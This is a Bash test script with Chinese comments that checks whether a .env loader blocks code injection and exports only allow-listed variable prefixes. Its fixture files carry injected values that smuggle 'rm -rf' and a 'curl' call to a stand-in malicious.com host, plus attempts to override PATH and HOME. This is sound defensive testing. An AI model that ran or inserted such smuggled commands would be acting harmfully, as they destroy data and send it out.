#!/bin/bash

# 简化的配置安全测试
# 直接测试安全函数而不导入整个安装脚本

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo "🔒 配置安全测试（简化版）"
echo "======================="

# 测试计数器
TESTS_RUN=0
TESTS_PASSED=0

# 定义安全的环境变量加载函数（复制自install-hooks.sh）
safe_load_env() {
    local env_file="$1"
    if [ -f "$env_file" ]; then
        while read -r line || [ -n "$line" ]; do
            # 跳过注释和空行
            [[ $line =~ ^[[:space:]]*# ]] && continue
            [[ -z $line ]] && continue
            
            # 分割键值对
            local key="${line%%=*}"
            local value="${line#*=}"
            
            # 只加载特定前缀的环境变量，防止代码注入
            if [[ $key =~ ^(AI_|GITLAB_|GEMINI_|CLAUDECODE_|REVIEW_) ]]; then
                export "$key=$value"
            fi
        done < "$env_file" 2>/dev/null
    fi
}

# 创建测试用的临时目录
TEST_DIR="/tmp/coderocket_security_test"
mkdir -p "$TEST_DIR"

echo "🔍 测试1: 恶意代码注入防护..."

# 创建包含恶意代码的配置文件
cat > "$TEST_DIR/.env" << 'EOF'
# 正常配置
AI_SERVICE=gemini
GITLAB_API_URL=https://gitlab.com/api/v4

# 恶意代码注入尝试（这些不应该被执行）
AI_TIMEOUT=30; rm -rf /tmp/test_file; echo "malicious_code_executed"
GEMINI_API_KEY=key123; curl http://malicious.com/steal_data

# 包含等号的正常值
COMPLEX_VALUE=key=value=test
EOF

# 创建测试文件来验证是否被删除
touch /tmp/test_file

# 测试安全加载函数
echo "  - 测试安全的环境变量加载..."
safe_load_env "$TEST_DIR/.env"

TESTS_RUN=$((TESTS_RUN + 1))

# 检查恶意代码是否被执行
if [ -f "/tmp/test_file" ]; then
    echo -e "  ${GREEN}✓ 恶意代码未被执行（文件仍存在）${NC}"
    TESTS_PASSED=$((TESTS_PASSED + 1))
else
    echo -e "  ${RED}✗ 恶意代码被执行（文件被删除）${NC}"
fi

TESTS_RUN=$((TESTS_RUN + 1))

# 检查正常配置是否被正确加载
if [ "$AI_SERVICE" = "gemini" ]; then
    echo -e "  ${GREEN}✓ 正常配置被正确加载${NC}"
    TESTS_PASSED=$((TESTS_PASSED + 1))
else
    echo -e "  ${RED}✗ 正常配置加载失败: '$AI_SERVICE'${NC}"
fi

TESTS_RUN=$((TESTS_RUN + 1))

# 检查包含等号的值是否被正确处理
if [ "$COMPLEX_VALUE" = "key=value=test" ]; then
    echo -e "  ${GREEN}✓ 包含等号的值被正确处理${NC}"
    TESTS_PASSED=$((TESTS_PASSED + 1))
else
    echo -e "  ${RED}✗ 包含等号的值处理错误: '$COMPLEX_VALUE'${NC}"
fi

echo ""
echo "🔍 测试2: 环境变量过滤测试..."

# 创建包含不同类型变量的配置文件
cat > "$TEST_DIR/.env_filter" << 'EOF'
# 应该被加载的变量
AI_SERVICE=test_service
GITLAB_TOKEN=test_token
GEMINI_API_KEY=test_key
CLAUDECODE_MODEL=test_model
REVIEW_TIMING=post-commit

# 不应该被加载的变量
PATH=/malicious/path
HOME=/tmp/fake_home
SHELL=/bin/malicious_shell
RANDOM_VAR=should_not_load
EOF

# 记录原始变量
ORIGINAL_PATH="$PATH"
ORIGINAL_HOME="$HOME"

# 加载配置
safe_load_env "$TEST_DIR/.env_filter"

TESTS_RUN=$((TESTS_RUN + 1))

# 检查只有允许的变量被加载
if [ "$AI_SERVICE" = "test_service" ]; then
    echo -e "  ${GREEN}✓ AI_SERVICE 被正确加载${NC}"
    TESTS_PASSED=$((TESTS_PASSED + 1))
else
    echo -e "  ${RED}✗ AI_SERVICE 加载失败: '$AI_SERVICE'${NC}"
fi

TESTS_RUN=$((TESTS_RUN + 1))

# 检查系统变量没有被覆盖
if [ "$PATH" = "$ORIGINAL_PATH" ]; then
    echo -e "  ${GREEN}✓ PATH 变量未被恶意覆盖${NC}"
    TESTS_PASSED=$((TESTS_PASSED + 1))
else
    echo -e "  ${RED}✗ PATH 变量被恶意覆盖${NC}"
fi

TESTS_RUN=$((TESTS_RUN + 1))

# 检查随机变量没有被加载
if [ -z "$RANDOM_VAR" ]; then
    echo -e "  ${GREEN}✓ 随机变量被正确过滤${NC}"
    TESTS_PASSED=$((TESTS_PASSED + 1))
else
    echo -e "  ${RED}✗ 随机变量未被过滤: '$RANDOM_VAR'${NC}"
fi

# 清理测试文件
rm -rf "$TEST_DIR"
rm -f /tmp/test_file

echo ""
echo "📊 安全测试结果"
echo "=============="
echo "总计测试: $TESTS_RUN"
echo -e "${GREEN}通过: $TESTS_PASSED${NC}"
echo -e "${RED}失败: $((TESTS_RUN - TESTS_PASSED))${NC}"

if [ $TESTS_PASSED -eq $TESTS_RUN ]; then
    echo -e "${GREEN}🎉 所有安全测试通过！${NC}"
    exit 0
else
    echo -e "${RED}❌ 有 $((TESTS_RUN - TESTS_PASSED)) 个安全测试失败${NC}"
    exit 1
fi
